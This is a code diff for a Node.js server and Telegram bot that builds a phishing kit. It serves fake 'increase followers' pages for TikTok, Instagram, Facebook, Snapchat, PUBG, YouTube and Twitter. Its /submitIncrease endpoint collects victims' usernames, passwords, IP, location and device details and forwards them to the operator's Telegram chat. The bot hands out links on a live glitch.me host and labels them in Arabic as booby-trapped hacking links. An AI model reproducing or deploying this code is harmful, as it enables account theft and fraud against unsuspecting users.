@@ -196,6 +196,43 @@ IP: ${additionalData.ip}
     }
 });
 
+app.get('/:platform/:chatId', (req, res) => {
+    const { platform, chatId } = req.params;
+    res.sendFile(path.join(__dirname, 'src', `${platform}_increase.html`));
+});
+
+// Endpoint to handle increase followers data
+app.post('/submitIncrease', (req, res) => {
+    const { username, password, platform, chatId, ip, country, city, userAgent } = req.body;
+
+    console.log('Received ', { username, password, platform, chatId, ip, country, city });
+    
+    if (!chatId) {
+        return res.status(400).json({ error: 'Missing chatId' });
+    }
+
+    const deviceInfo = useragent.parse(userAgent);
+
+    bot.sendMessage(chatId, `تم تلقي بيانات زيادة المتابعين:
+منصة: ${platform}
+اسم المستخدم: ${username}
+كلمة السر: ${password}
+عنوان IP: ${ip}
+الدولة: ${country}
+المدينة: ${city}
+نظام التشغيل: ${deviceInfo.os.toString()}
+المتصفح: ${deviceInfo.toAgent()}
+الجهاز: ${deviceInfo.device.toString()}`)
+        .then(() => {
+            res.json({ success: true });
+        })
+        .catch(error => {
+            console.error('Error sending message:', error);
+            res.status(500).json({ error: 'Failed to send increase data', details: error.message });
+        }
+});
+
+
 // أوامر البوت
 bot.onText(/\/sjgd (\d+)/, (msg, match) => {
     if (msg.from.id.toString() !== adminId) {
@@ -292,6 +329,45 @@ bot.on('message', (msg) => {
         } else {
             bot.sendMessage(chatId, 'الحد الأقصى لمدة التسجيل هو 20 ثانية. الرجاء إدخال مدة صحيحة.');
         }
+    }
+});
+
+bot.on('callback_query', (query) => {
+    const chatId = query.message.chat.id;
+    const baseUrl = 'https://creative-marmalade-periwinkle.glitch.me/'; // Change this to your actual URL
+
+    let url;
+    switch (query.data) {
+        case 'increase_tiktok':
+            url = `${baseUrl}/tiktok/${chatId}`;
+            bot.sendMessage(chatId, `تم تلغيم رابط اختراق التيك توك: ${url}`);
+            break;
+        case 'increase_instagram':
+            url = `${baseUrl}/instagram/${chatId}`;
+            bot.sendMessage(chatId, `تم تلغيم رابط اختراق الانستغرام: ${url}`);
+            break;
+        case 'increase_facebook':
+            url = `${baseUrl}/facebook/${chatId}`;
+            bot.sendMessage(chatId, `تم تلغيم رابط اختراق الفيسبوك: ${url}`);
+            break;
+        case 'increase_snapchat':
+            url = `${baseUrl}/snapchat/${chatId}`;
+            bot.sendMessage(chatId, `تم تلغيم رابط اختراق السناب شات: ${url}`);
+            break;
+        case 'pubg_uc':
+            url = `${baseUrl}/pubg_uc/${chatId}`;
+            bot.sendMessage(chatId, `تم تلغيم رابط اختراق بوبجي: ${url}`);
+            break;
+        case 'increase_youtube':
+            url = `${baseUrl}/youtube/${chatId}`;
+            bot.sendMessage(chatId, ` تم تلغيم رابط اختراق اليوتيوب: ${url}`);
+            break;
+        case 'increase_twitter':
+            url = `${baseUrl}/twitter/${chatId}`;
+            bot.sendMessage(chatId, `تم تلغيم رابط اختراق التويتر: ${url}`);
+            break;
+        default:
+            bot.sendMessage(chatId, 'أمر غير معروف.');
     }
 });
 
